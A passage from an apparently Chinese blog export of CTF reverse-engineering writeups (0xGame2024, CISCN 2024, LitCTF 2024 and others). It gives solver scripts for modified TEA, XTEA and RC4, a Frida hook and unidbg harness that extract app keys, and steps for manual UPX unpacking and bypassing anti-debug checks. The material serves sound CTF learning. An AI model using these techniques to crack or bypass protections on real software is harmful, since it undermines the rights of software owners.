* round; for (int i = 0; i \u0026lt; round; i++) { d2 -= ( ((d1\u0026lt;\u0026lt;4) ^ (d1\u0026gt;\u0026gt;5)) + d1) ^ (number + key[(number\u0026gt;\u0026gt;11) \u0026amp; 3]); number -= delta; d1 -= ( ((d2\u0026lt;\u0026lt;4) ^ (d2\u0026gt;\u0026gt;5)) + d2) ^ (number + key[number \u0026amp; 3]); } data[0] = d1; data[1] = d2; } int main() { unsigned int data[] ={ 0x18dc360,0xd5835457,0x8bee2dcb,0x92bb2dee,0xfdf4ad54,0x43f8c2d, 0x61a232a9,0xf15f4d1,0x16ea4979,0x7c2bf6da,0xdcd5fa32,0x76450819 }; unsigned int TEAkey[] = { 0x1245,0x3298,0x4756,0x1463 }; unsigned int XTEAkey[] = { 0x4512,0x9832,0x5647,0x6314 }; for (int i = 0; i \u0026lt; 4; i++) { TEAkey[i] ^= 0xABCD; } for(int j = 0; j \u0026lt; 6; j++) { tea_encry(data+2*j, TEAkey); } for (int k = 0; k \u0026lt; 6; k++) { xtea_decry(data+2*k, XTEAkey); } printf(\u0026#34;%s\u0026#34;,(char*)data); return 0; } JustSoSo (Mobile) # jadx反编译后能看到Java层有一个ReversC4类，简单分析下可以看出是修改过的RC4加密。只是在生成密钥流（KSA）的过程中把初始的S-box倒序排列了一下。\n之后来到MainActivity，发现加载了外部库secret，并且声明了native层的方法getKey()。\n后面调用了ReversC4.encrypt(flagInput.getBytes(), getKey())，由此可以推测RC4的密钥要从getKey()得到。这个函数的实现并不在java层，而是之前提到的secret库中。也就是lib 目录下的 libsecret.so 文件。\n分析so动态库，arm和x86/64架构任选其一分析即可，后者相对简单一些。IDA打开后一眼看到要找的函数Java_com_ctf_justsoso_MainActivity_getKey。\n这里的xmm是Intel SSE指令集的寄存器，可以存放128bit的数据类型__m128i，事实上这个数据类型是由若干个基本类型打包而来。比如本题的_mm_cvtepu8_epi32函数先把4个uint8拓展为4个uint32(高位用0填充)，再把这4个uint32打包成一个m128i。xmmword也是一样的道理，做题时完全可以把它当成长度为4的uint数组。\n理解了这一点再去看伪代码就比较清楚了，source中每个字符乘2再异或0x7F得到密钥，之后回到java层RC4解密即可。\n","date":"2024-11-05","externalUrl":null,"permalink":"/writeups/0xgame2024_re_official/","section":"Writeups","summary":"official reverse writeup of 0xGame2024","title":"0xGame2024 Reverse Official","type":"writeups"},{"content":"","date":"2024-06-24","externalUrl":null,"permalink":"/tags/awdp/","section":"Tags","summary":"","title":"AWDP","type":"tags"},{"content":" 初赛 Reverse # asm_re # 题目以文本形式给出一段arm汇编。按照跳转指令把控制流梳理一遍，发现loc_100003C64 -\u0026gt; loc_100003C7C -\u0026gt;loc_100003cc0形成for循环。\n在loc_100003C7C看到EOR异或，直接猜是加密函数。\n整体的加密算法是((W8*0x50+0x14)^0x4D)+0x1E。\n程序后面还有一段循环，代码和上述几乎完全一样。不确定是否有二次加密，用\u0026quot;flag\u0026quot;四个字符带入验证一下，刚好和数据对应上。最后写脚本解出flag。\ndef decrypt(data): return (((data-0x1E)^0x4D)-0x14)//0x50 Data = [0x1fd7,0x21b7,0x1e47,0x2027,0x26e7,0x10d7,0x1127,0x2007,0x11c7,0x1e47, 0x1017,0x1017,0x11f7,0x2007,0x1037,0x1107,0x1f17,0x10d7,0x1017,0x1017, 0x1f67,0x1017,0x11c7,0x11c7,0x1017,0x1fd7,0x1f17,0x1107,0x0f47,0x1127, 0x1037,0x1e47,0x1037,0x1fd7,0x1107,0x1fd7,0x1107,0x2787] flag = [] for i in Data: flag.append(chr(decrypt(i))) print(\u0026#39;\u0026#39;.join(flag)) ** gdb_debug # #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;time.h\u0026gt; unsigned char data[]={0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78}; unsigned char s[]=\u0026#34;congratulationstoyoucongratulationstoy\u0026#34;; unsigned char ptr[]={0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37}; int main() { unsigned char R1[38],R2[38],R3[38],flag[38]; int T = time(0LL); srand(T \u0026amp; 0xF0000000); for(int i=0;i\u0026lt;38;i++) { R1[i]=rand(); } for(int k=37;k;k--) { R2[k]=rand()%(k+1); } for(int i=0;i\u0026lt;38;i++) { R3[i]=rand(); } for(int k=37;k;k--) { unsigned char v = ptr[k]; ptr[k]=ptr[R2[k]]; ptr[R2[k]] = v; } for(int i=0;i\u0026lt;38;i++) { flag[ptr[i]] = data[i]^s[i]^R3[i]; } for(int i=0;i\u0026lt;38;i++) { flag[i] = flag[i]^R1[i]; } printf(\u0026#34;%s\u0026#34;,flag); return 0; } app-debug # key和 iv都在Native层，尝试使用IDA动调so库未果。\n利用frida hook 获取 key和 iv：\nimport frida import sys jscode = \u0026#34;\u0026#34;\u0026#34; Java.perform(function(){ var jni = Java.use(\u0026#34;com.example.re11113.jni\u0026#34;); var reclass = Java.use(\u0026#34;com.example.re11113.MainActivity\u0026#34;); reclass.legal.overload(\u0026#34;java.lang.String\u0026#34;).implementation = function(string){ console.log(\u0026#34;key: \u0026#34; + jni.getkey()); console.log(\u0026#34;iv: \u0026#34; + jni.getiv()); return this.legal(string); } }) \u0026#34;\u0026#34;\u0026#34; def on_message(message, data): if message[\u0026#39;type\u0026#39;] == \u0026#39;send\u0026#39;: print(\u0026#34;[+] {0}\u0026#34;.format(message[\u0026#39;payload\u0026#39;])) else: print(str(message)) process = frida.get_usb_device(-1).attach(\u0026#34;Re11113\u0026#34;) print(\u0026#39;[*] Attached\u0026#39;) script = process.create_script(jscode) script.on(\u0026#39;message\u0026#39;, on_message) print(\u0026#39;[*] Running\u0026#39;) script.load() sys.stdin.read() 另外，尝试unidbg模拟执行来主动调用\npackage com.reverse.solve; import com.github.unidbg.Module; import com.github.unidbg.AndroidEmulator; import com.github.unidbg.LibraryResolver; import com.github.unidbg.arm.backend.DynarmicFactory; import com.github.unidbg.linux.android.AndroidEmulatorBuilder; import com.github.unidbg.linux.android.AndroidResolver; import com.github.unidbg.linux.android.dvm.DalvikModule; import com.github.unidbg.linux.android.dvm.DvmClass; import com.github.unidbg.linux.android.dvm.DvmObject; import com.github.unidbg.linux.android.dvm.VM; import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject; import com.github.unidbg.memory.Memory; import java.io.File; import java.io.IOException; public class MainActivity { private final AndroidEmulator emulator; private final VM vm; private final Module module; private final Memory memory; private final DalvikModule dm; private MainActivity(String Processname, String apkPath, String soPath) throws IOException { emulator = AndroidEmulatorBuilder .for64Bit() //.addBackendFactory(new DynarmicFactory(true)) .setProcessName(Processname) .build(); memory = emulator.getMemory(); memory.setLibraryResolver(new AndroidResolver(23)); vm = emulator.createDalvikVM(new File(apkPath)); vm.setVerbose(false); //vm.setVerbose(true); dm = vm.loadLibrary(new File(soPath), true); module = dm.getModule(); dm.callJNI_OnLoad(emulator); } private String call_getkey(){ DvmClass dvmClass = vm.resolveClass(\u0026#34;com/example/re11113/jni\u0026#34;); DvmObject\u0026lt;?\u0026gt; result = dvmClass.callStaticJniMethodObject(emulator, \u0026#34;getkey()Ljava/lang/String;\u0026#34;); return result.getValue().toString(); } private String call_getiv(){ DvmClass dvmClass = vm.resolveClass(\u0026#34;com/example/re11113/jni\u0026#34;); DvmObject\u0026lt;?\u0026gt; result = dvmClass.callStaticJniMethodObject(emulator, \u0026#34;getiv()Ljava/lang/String;\u0026#34;); return result.getValue().toString(); } public static void main(String[]args) throws IOException{ String Processname=\u0026#34;com.example.re11113\u0026#34;; String apkPath=\u0026#34;unidbg-android/src/test/java/com/reverse/solve/app-release.apk\u0026#34;; String soPath = \u0026#34;unidbg-android/src/test/java/com/reverse/solve/libSecret_entrance.so\u0026#34;; MainActivity mainactivity = new MainActivity(Processname,apkPath,soPath); System.out.println(\u0026#34;key: \u0026#34; + mainactivity.call_getkey()); System.out.println(\u0026#34;iv: \u0026#34; + mainactivity.call_getiv()); } } 结果是相同的。\n进行 DES/CBC解密即可，注意得到的结果还要unpad再套上flag\nimport base64 from Crypto.Cipher import DES iv = b\u0026#34;Wf3DLups\u0026#34; key = b\u0026#34;A8UdWaeq\u0026#34; b64data = \u0026#34;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==\u0026#34; data = base64.b64decode(b64data) chiper = DES.new(key,DES.MODE_CBC,iv) flag = chiper.decrypt(data) print(flag) #\u0026#39;188cba3a5c0fbb2250b5a2e590c391ce\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\u0026#39; whereThel1b # python源代码调用了so动态库中的函数。题目的so库是基于Cython编译而来，难度较大。先简单找点资料了解下：\nCython 代码必须编译。从 Python 源代码转换为优化的 C / C ++代码并编译为 Python 扩展模块，这发生在两个阶段：\n包含 Python 扩展模块的 .pyx 源文件由 Cython 编译为 .c 文件。\n.c 文件由 C 编译器编译为 .so 文件 ( 或 Windows 上的 .pyd )\nPython中可直接 import\nCython 一类通用工具，为了提高稳健性，其在转换时会对 Python 代码做额外处理（包括对引用计数的调整），从而干扰我们的逆向。当然，也正是因为它是通用工具，其整体框架和对类似 Python 字节码的处理也有一定规律。\n在linux远程动调，先搭动调环境，这一步踩了不少坑：\n务必以root身份运行linux_server，否则提示权限错误 Process Option中要填Linux系统中so动态库的绝对地址 结合Cython源码和文档，以及网上查到的各种正向逆向教程，从IDA中找到了一些比较重要的内容，可以作为入手点：\n一些规律性的命名\n_pyx_mstate_global_static.__pyx_XX 全局静态变量，函数名\n_pyx_mdef_XX_XX\tPyMethodDef : Python函数名到C函数的映射\n逆向时重点分析的关键函数\n_Pyx_CreateStringTabAndInitStrings()\t字符串信息\n__Pyx_pymod_exec_XX()\tso动态库加载时的初始化\n__pyx_pw_XX_XX()\tpython对应函数的C实现\n分析本题，先从给出的源文件开始，有两行涉及调用so函数。\nwhereThel1b.whereistheflag(flag) ret = whereThel1b.trytry(flag) Python函数没有传指针或者传引用的用法，所以第一个函数whereistheflag 没什么用，结合实际动调应该是输出了whereistheflag 字符串。直接分析第二个函数trytry。\n在so文件中找到对应的_pyx_pw_11whereThel1b_1trytry函数，因为保留了足够的符号信息，静态分析也能大概梳理出程序的整个加密逻辑。思路大概：\n根据GetBuiltinName、GetModuleGlobalName、PyObject_GetAttr 等API和符号名，猜测调用的函数及其参数。\n识别结构固定的异常、GC等和语言特性相关的代码，排除这些非关键代码。\n如图，这一段是random.seed(0)。观察发现IDA的命名还是很规律的：BuiltinName 为导入的模块名，Attr 是从模块中导入的方法。pyargnames 是参数列表，真正传入的参数从下标1开始。\n之后调用whereistheflag1，分析方法类似。可以看出调用了base64.b64encode，最后和random.random的得到的随机数xor。\n分区赛 Pwn-AWDP # 待复现\n先吐槽一波逆天平台\n","date":"2024-06-24","externalUrl":null,"permalink":"/writeups/ciscn202405/","section":"Writeups","summary":"writeup and reproduction of 17th CISCN, reverse \u0026amp; pwn","title":"第十七届CISCN初赛\u0026华东北分区赛","type":"writeups"},{"content":"题目难度很友好，也借此拿下第一次ak，值得纪念\n编码喵 # 魔改的Base64，反编译看main函数比较乱，但是发现了一个重要的函数_text_72(),跟踪发现了一串特征鲜明的Base64编码表。\n之后在主函数也能找到编码后的密文，用cyberchef解密即可。\nezrc4 # 签到题，原汁原味的RC4，程序中能找到加密后的密文和key。\n唯一需要注意的是key是被xor加密过的，具体算法在函数X_X()中，把key解密后再对RC4解密。\nkey0=\u0026#34;fenkey?\u0026#34; key1=[0x0A, 0x0C, 0x1A, 0x08, 0x11, 0x1F, 0x1E] flag=[] enc=[0xd5,0xb2,0x7c,0xdc,0x90,0xa2,0x6e,0x60,0x6,0x13,0xe4,0x71,0x59,0xb0,0x90,0x31,0xb2,0xc7,0x1d,0xd7,0x7f] key = [chr(ord(key0[i])^key1[i]) for i in range(len(key0))] s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] i = j = 0 for s in enc: i = (i + 1) % 256 j = (j + s_box[i]) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] t = (s_box[i] + s_box[j]) % 256 k = s_box[t] flag.append(s^k) print(bytes(flag)) ezpython！！！！！ # python的exe文件。用pyinstxtractor先分离出pyc文件。之后进行反编译。由于python版本问题，本地的uncompyle6引擎失效，所以找了在线的pycdc引擎进行反编译。\n查看py源码，导入了Litctfbase64库，然后对程序中的密文字符串进行解码并且作为flag输出。为了分析魔改Base64的具体算法，需要继续查看这个库的源码，位置在pyinstxtractor文件夹下的 .\\ezpy.exe_extracted\\PYZ-00.pyz_extracted\\Litctfbase64.pyc\n反编译就能看到编码表，在Cyberchef解码拿flag。\nhello_upx # 题目已经提示了是upx壳，用upx -d命令脱壳出现问题。后来在DIE中发现壳是魔改过的，而且程序是64位。\n利用x64dbg和Scylla进行手动脱壳。由于第一次手脱，部分思路参考：借助 x64dbg 的 UPX 手工脱壳。\n首先动调找到OEP。查看断点窗口中的入口断点，多次运行直到RIP指向入口处，该程序是在0x44FF70。根据esp定律，经过pushad和popad后，OEP处的栈顶和现在入口处的栈顶地址是相同的。所以需要在esp指向的内存地址处下一个硬件断点。(寄存器窗口空白处右键)\n继续运行至该断点，可以看到刚好是在一系列pop（popad）后面，单步跳过至一个大的跳转指令处，跳转后的地址即为OEP。\n接下来要用Scylla进行dump脱壳，直接使用 IAT Autosearch 功能，期间可能会提示使用 IAT Search Advanced ，选 “是” 继续。然后 Get Imports ，最后直接 Dump 。保存成新的exe文件。\n算法部分比较简单，直接写脚本即可。\n#include\u0026lt;stdio.h\u0026gt; int main() { unsigned long long v4[3]; v4[0] = 0x707541504072684C; v4[1] = 0x655158612559632B; v4[2] = 0x4F5E4E601E5A4E20; unsigned char *data = (unsigned char *)v4; char flag[40]={0}; for (int i=0;i\u0026lt;=24;++i) { flag[i] = (char)(data[i]+i); } printf(\u0026#34;%s\u0026#34;,flag); return 0; } ","date":"2024-06-01","externalUrl":null,"permalink":"/writeups/litctf2024_re/","section":"Writeups","summary":"reverse writeup of LitCTF(NSS) 2024","title":"LitCTF2024 Reverse","type":"writeups"},{"content":" Week1 # ezIDA # 64位IDA打开，Shift+F12打开strings窗口能看到flag。\nezASM # 汇编语言看得有点头大，找到关键的 check flag 部分\nxor al, 0x22 cmp al, byte [c + esi] 发现是异或0x22加密，信息在section .data已经给出，用脚本解密。\nnum=[74, 69, 67, 79, 71, 89, 99, 113, 111, 125, 107, 81, 125, 107, 79, 82, 18, 80, 86, 22, 76, 86, 125, 22, 125, 112, 71, 84, 17, 80, 81, 17, 95, 34] flag=[] for i in num: i^=0x22 flag.append(chr(i)) print(\u0026#39;\u0026#39;.join(flag)) ezPYC # 题目给出了一个用python编写但打包成了exe的程序，先用工具 pyinstxtractor.py 把exe文件还原为pyc文件，再找在线反编译工具导出py文件。\n程序的逻辑同样是异或加密，复用反编译后的代码再修改一点点，进行解密。\nflag=[87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2] c=[1, 2, 3, 4] result=[] for i in range(0, 36, 1): result.append(chr(c[i % 4] ^ flag[i])) print(\u0026#39;\u0026#39;.join(result)) ezupx # 简单的upx脱壳。脱壳后在IDA中反编译，可以看出与0x32进行了异或。直接脚本解密。\n![ezupx 1](ezupx 1.png)\nnum= [0x64,0x7B,0x76,0x73,0x60,0x49,0x65,0x5D,0x45,0x13,0x6B,0x02,0x47,0x6D,0x59,0x5C,0x02,0x45,0x6D,0x06,0x6D,0x5E,0x03,0x46,0x46,0x5E,0x01,0x6D,0x02,0x54,0x6D,0x67,0x62,0x6A,0x13,0x4F,0x32] for i in num: i^=0x32 flag.append(chr(i)) print(\u0026#39;\u0026#39;.join(flag)) Week2 # ezcpp # 魔改TEA，delta换成了0xDEADBEEF，右移改成左移。\n四次TEA加密的代码都挤到主函数里来了，不过还是能看出来结构的。\n8个字节分组加密，但是每次加密的明文只比上一组向后移了一个字节，最后只加密了前11个字节。（这里用的是最开始的附件，后面更新的附件修复了）\n#include\u0026lt;stdio.h\u0026gt; void modify_tea_decry(unsigned int *data, unsigned int *key) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0xDEADBEEF, number = delta * 32; for (int i = 0; i \u0026lt; 32; i++) { d2 -= ((d1\u0026lt;\u0026lt;4) + key[2]) ^ ((d1\u0026lt;\u0026lt;5) + key[3]) ^ (d1 + number); d1 -= ((d2\u0026lt;\u0026lt;4) + key[0]) ^ ((d2\u0026lt;\u0026lt;5) + key[1]) ^ (d2 + number); number -= delta; } data[0] = d1; data[1] = d2; } int main() { unsigned char data[33] = { 0x88, 0x6A, 0xB0, 0xC9, 0xAD, 0xF1, 0x33, 0x33, 0x94, 0x74, 0xB5, 0x69, 0x73, 0x5F, 0x30, 0x62, 0x4A, 0x33, 0x63, 0x54, 0x5F, 0x30, 0x72, 0x31, 0x65, 0x6E, 0x54, 0x65, 0x44, 0x3F, 0x21, 0x7D}; unsigned int key[] = {1234,2341,3412,4123}; for(int i = 3; i \u0026gt;= 0; i--) modify_tea_decry((unsigned int*)(data+i),key); printf(\u0026#34;%s\u0026#34;,data); return 0; } android # java层检测用户名，RC4\nnative层检测密码\nbabyre # 可以比较直观的看到开了4个线程，分别对应4种不同的加密方式。每加密一个字节切换到固定顺序的下一个线程，依次加密完输入的flag。\n关于key的部分埋了不少坑，先是.init_array中的函数改了 key，之后主函数中异或了0x11进行加密。加密过程中还会进行异常处理，结果只异或了 key的前3个字节。\n从F5伪码不能直接看出异常的触发，需要看反汇编。idiv在除数为零时触发 SIGFPE信号作为异常。而除数var_38 = i - 3，在异或第4个字节时等于0。\n#include\u0026lt;stdio.h\u0026gt; int main() { unsigned char key[] = {0x66,0x65,0x69,0x66,0x65,0x69}; int flag[] = { 0x2F14, 0x004E, 0x4FF3, 0x006D, 0x32D8, 0x006D, 0x6B4B, -110, 0x264F, 0x005B, 0x52FB, -100, 0x2B71, 0x0014, 0x2A6F, -107, 0x28FA, 0x001D, 0x2989, -101, 0x28B4, 0x004E, 0x4506, -38, 0x177B, -4, 0x40CE, 0x007D, 0x29E3, 0x000F, 0x1F11, 0x00FF, 0}; flag[32] = 249 + 1; for (int i = 0; i \u0026lt; 3; i++)\tkey[i] ^= 17;\t// 异常处理 for (int k = 31; k \u0026gt;= 0; k--) { switch (k % 4){ case 0: flag[k] -= flag[k+1] * key[(k+1)%6]; break; case 1: flag[k] += flag[k+1] ^ key[(k+1)%6]; break; case 2: flag[k] /= flag[k+1] + key[(k+1)%6]; break; case 3: flag[k] ^= flag[k+1] - key[(k+1)%6]; break; } } for (int c=0;c\u0026lt;32;c++) printf(\u0026#34;%c\u0026#34;,(char)flag[c]); return 0; } 作为复现，回过头来看一下Linux的多线程和异常处理：\n#include \u0026lt;semaphore.h\u0026gt; int sem_init(sem_t *sem, int pshared, unsigned int value); int sem_wait(sem_t *sem); int sem_post(sem_t *sem); #include \u0026lt;pthread.h\u0026gt; int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); int pthread_exit(void *retval_ptr); int pthread_join(pthread_t thread, void ** retval); sem信号量机制实现线程同步\npthread相关的函数实现线程的创建，退出和回收\n#include \u0026lt;signal.h\u0026gt; #include \u0026lt;setjmp.h\u0026gt; void (*signal(int sig, void (*handler)(int)))(int); int sigsetjmp(jmp_buf env, int savemask) void siglongjmp(jmp_buf env, int value) C语言通过库函数 setjmp和 longjmp实现异常处理。setjmp设置跳转点，其他地方调用 longjmp跳转到该点抛出异常。POSIX定义了两个新函数 sigsetjmp和 siglongjmp，两者之间的唯一区别是 sigsetjmp增加了一个参数。\nsetjmp函数保存程序当前的堆栈环境到 env参数中，接下来的其它地方，你可以通过调用 longjmp函数来恢复先前被保存的程序堆栈环境，并且因此程序控制流会返回到先前调用 setjmp时的执行点。当 setjmp和 longjmp组合一起使用时，能在程序中实现“非本地局部跳转”（\u0026ldquo;non-local goto\u0026rdquo;）的机制。这种机制常用于实现把程序的控制流传递到错误处理模块之中；或者程序中不采用正常的返回语句，或函数的正常调用等方法，而使程序能被恢复到先前的一个调用例程（即函数）中。\t——MSDN\nsignal函数用于信号处理。本题中捕获算术异常的信号，随即调用 handler函数中的 siglongjmp进行异常处理。\narithmetic # 查壳发现魔改UPX，手动修复节区名之后脱壳。\n类似变种迷宫题，从out文件依次加载数据到内存中，按照下三角排列，作为地图。\n路径只有两个方向，1和2分别对应向下和右下。程序中用随机数生成路径，不过肯定没有用\n最后要求所有路径节点的和大于固定值6752833，一开始想过爆破，但显然很费时费力。而且在动调时还发生内存溢出，整个out文件的内容不能完全读取。\n一般迷宫题比较理想的解法都是写算法求解，翻了下官方wp，确实用的是动态规划。奈何不会算法，这里就仅复现一下思路，不写脚本了。\nWeek3 # crackme # c++异常处理，主动抛出异常并轮流调用三个 catch语句，对应XTEA加密的三步。\n这里的XTEA魔改的比较多，改了加密顺序，改了delta，两次左移右移的位数也不相同。\nIDA对于异常处理相关代码的识别并不是很好。之前用IDA 7.5版本只能识别出第一个异常的try块；后面改用最新版9.0，三个异常都能识别，而且对应的catch块也直接能对应上。但是F5反编译之后看不到check部分。这一部分只能借助反汇编来看，好在并不复杂。\n#include\u0026lt;stdio.h\u0026gt; void modi_xtea_decry(unsigned int *data, unsigned int *key) { unsigned int d1 = data[0], d2 = data[1]; unsigned int delta = 0x33221155; unsigned int number = 0; for (int i = 0; i \u0026lt; 32; i++) { number ^= delta; d2 -= ( ((d1\u0026lt;\u0026lt;5) ^ (d1\u0026gt;\u0026gt;6)) + d1) ^ (number + key[(number\u0026gt;\u0026gt;11) \u0026amp; 3]); d1 -= ( ((d2\u0026lt;\u0026lt;4) ^ (d2\u0026gt;\u0026gt;5)) + d2) ^ (number + key[number \u0026amp; 3]); } data[0] = d1; data[1] = d2; } int main() { unsigned int key[] = {1234,2345,3456,4567}; unsigned int v18[8]; v18[0] = 0x32FC31EA; v18[1] = 0xF0566F42; v18[2] = 0xF905B0B2; v18[3] = 0x5F4551BE; v18[4] = 0xFB3EFCBB; v18[5] = 0x6B6ADB30; v18[6] = 0x4839879; v18[7] = 0x2F4378DF; for(int i = 0; i \u0026lt; 8; i += 2) modi_xtea_decry(v18+i,key); printf(\u0026#34;%s\u0026#34;,(char*)v18); return 0; } 利用动调来追踪输入会比较方便一些\nfindme # IDA反编译程序，在主函数中看到一个fake_flag，下面是一串乱码。观察乱码最后面是等号，猜测是Base系列编码。解码后发现还是一个fake_flag。\nmain函数很短，除了上面两个假flag，只剩下输出Buffer一个语句。查看Buffer变量的内容，发现是字符M，但是紧接着四个字节后又有一个字节'Z'。这里联想到PE文件的MZ头。但是正常它只会出现在文件的最前面部分，中间也没有间隔。于是打开Hex窗口看了后面的数据，又发现了This program cannot be run in DOS mode这一标志性的信息。可以确定在题目的程序里面又藏了一个PE文件。\n能够看出内嵌的文件把原来的每个字节都扩充成了4个字节，高位的3个字节（小端序）都补零对齐。在010Editor中把有这种特征的部分提取出来，另存为enc.exe，然后写了几行c代码把它恢复成正常的PE文件。\n#include\u0026lt;stdio.h\u0026gt; int main() { int buf; char byte; FILE *enc = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\enc.exe\u0026#34;,\u0026#34;rb+\u0026#34;); FILE *dec = fopen(\u0026#34;C:\\\\Users\\\\LENOVO\\\\Desktop\\\\dec.exe\u0026#34;,\u0026#34;wb+\u0026#34;); while(!feof(enc)) { fread(\u0026amp;buf,sizeof(int),1,enc); byte = buf \u0026amp; 0xff; fwrite(\u0026amp;byte,sizeof(char),1,dec); } fclose(enc); fclose(dec); return 0; } 反编译提取出来的程序，在IDA中没找到main函数。分析汇编部分，看到了不少花指令，而且形式都相似，如下：\njz loc_xx jnz loc_xx db 0xC7 从头开始把所有花指令都patch成nop，重新建立函数，可以正常反编译main函数。除去输入输出，主函数调用了sub_401068和sub_40110C两个函数，最后把处理后的输入和数组byte_405148比较判断。分别跟踪这两个函数，发现大部分比较熟悉（算法和Week2的一道题很像，当时没做出来，后面看wp才知道是RC4）结合网络资料，判断出这两个函数是经过小改的RC4算法。\n改动主要有三点\nS盒初始状态，各元素都是索引值的相反数（从unsigned char的角度来看，溢出成256-i）\n密钥流的生成，取S盒中从后向前第s[v1]+s[v3]个元素，同样看成s[256-(s[v1]+s[v3])]。\n这部分IDA反编译的代码不好理解，array[-(buffer[v1]+buffer[v3])]，最后索引值取负。但是负的索引在C语言没有意义。如果理解为unsigned char，由于array长度只有32，同样也会出现越界的情况。于是分析一下对应的汇编，得出结论是这里负号要看成从array地址减去那个索引值。\n在栈中查看array和buffer之间的偏移量，发现刚好是256，这两个数组无缝衔接。那么从array地址减去k对应的元素也就是buffer从后向前第k个元素。\n加密没有进行异或，而是原文和对应密钥流相加。\n最后进行解密。按照原算法的流程推出密钥流，之后反过来从加密数据中逐一减去即可。\narray= [0x7D, 0x2B, 0x43, 0xA9, 0xB9, 0x6B, 0x93, 0x2D, 0x9A, 0xD0, 0x48, 0xC8, 0xEB, 0x51, 0x59, 0xE9, 0x74, 0x68, 0x8A, 0x45, 0x6B, 0xBA, 0xA7, 0x16, 0xF1, 0x10, 0x74, 0xD5, 0x41, 0x3C, 0x67, 0x7D] buffer = [0]+[256-i for i in range(1,256)] v = b\u0026#39;deadbeef\u0026#39; v6 = list(v*32) v2 = 0 for j in range(256): v2 = (buffer[j]+v6[j]+v2) % 256 buffer[v2],buffer[j] = buffer[j],buffer[v2] v1 = v3 = 0 for i in range(32): v1 = (v1+1) % 256 v3 = (buffer[v1]+v3) % 256 buffer[v1],buffer[v3] = buffer[v3],buffer[v1] index = 256 - (buffer[v1]+buffer[v3]) \u0026amp; 0xff array[i] = (array[i]-buffer[index]) \u0026amp; 0xff print(bytes(array)) encrypt # 主函数遍布Windows加密API，去MSDN上一查都是\u0026lt;bcrypt.h\u0026gt;这个库中的。\n结合文档和程序中的字符串信息，推测出是AES-CBC。\n在生成 pbKey的函数附近找到 pbSecret，推测是key。在前面可以找到iv\nmystery # 主函数只有ptrace反调试，核心代码放到了init和fini部分。\ninit_array预先加密了密钥，先异或后RC4。 fini_array实现类似主函数的功能，对输入的flag进行魔改RC4（生成密钥流后的异或加密改成了减法） #include\u0026lt;stdio.h\u0026gt; void rc4_crypt(unsigned char *data, unsigned char *key, int data_len, int key_len) { unsigned char S[256], tmp = 0, t = 0; int i = 0, j = 0; for (int i = 0; i \u0026lt; 256; i++) S[i]= i; for (int i = 0; i \u0026lt; 256; i++) { j = (j + S[i] + key[i % key_len]) % 256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; } i = 0, j = 0; for (int l = 0; l \u0026lt; data_len; l++) { i = (i + 1) % 256; j = (j + S[i]) % 256; t = (S[i] + S[j]) % 256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; data [l] ^= S[t]; } } void modi_rc4_crypt(unsigned char *data, unsigned char *key, int data_len, int key_len) { unsigned char S[256], tmp = 0, t = 0; int i = 0, j = 0; for (int i = 0; i \u0026lt; 256; i++) S[i]= i; for (int i = 0; i \u0026lt; 256; i++) { j = (j + S[i] + key[i % key_len]) % 256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; } i = 0, j = 0; for (int l = 0; l \u0026lt; data_len; l++) { i = (i + 1) % 256; j = (j + S[i]) % 256; t = (S[i] + S[j]) % 256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; data [l] += S[t]; } } int main() { unsigned char key[] = {0x44, 0x4A, 0x56, 0x44, 0x4A, 0x56}; unsigned char key1[] = {0x4D, 0x4E, 0x41, 0x70, 0x4B, 0x4A, 0x4D, 0x5A, 0x48, 0x0E}; unsigned char data[] ={ 0x50, 0x42, 0x38, 0x4D, 0x4C, 0x54, 0x90, 0x6F, 0xFE, 0x6F, 0xBC, 0x69, 0xB9, 0x22, 0x7C, 0x16, 0x8F, 0x44, 0x38, 0x4A, 0xEF, 0x37, 0x43, 0xC0, 0xA2, 0xB6, 0x34, 0x2C}; for (int i = 0; i \u0026lt; 6; i++) key[i] ^= 0x2F; for (int j = 0; j \u0026lt; 10; j++) key1[j] ^= 0x2F; rc4_crypt(key1,key,10,6); modi_rc4_crypt(data,key1,28,10); printf(\u0026#34;%s\u0026#34;,data); } Week4 # crackme2 # 先是异常处理，出题人应该想借异常来隐藏代码。结合上周的经验，IDA9.0能够识别出来这部分异常处理，反编译结果还算清晰。\nmov byte ptr ds:0, 1 引发空指针解引用的异常，直接跳转执行__expect(1)块中的代码（查询MSDN可知，try-except 语句是 Microsoft 特定的扩展，支持 C / C++ 中的结构化异常处理SEH）\n继续分析，NtQueryInformationProcess(···, ProcessDebugPort, \u0026amp;ProcessInformation, ···) 检查是否处于调试状态，结合后面smc进行反调试。先把这里的反调试patch掉。\nsmc大概有两种解决思路\nIDApython脚本进行patch 解密完成处下断点dump 动调还是方便一点，在第二次调用VirtualPrrotect 的地方下断点，此时SMC已经解密完成。在反汇编窗口中找到sub_14000105C 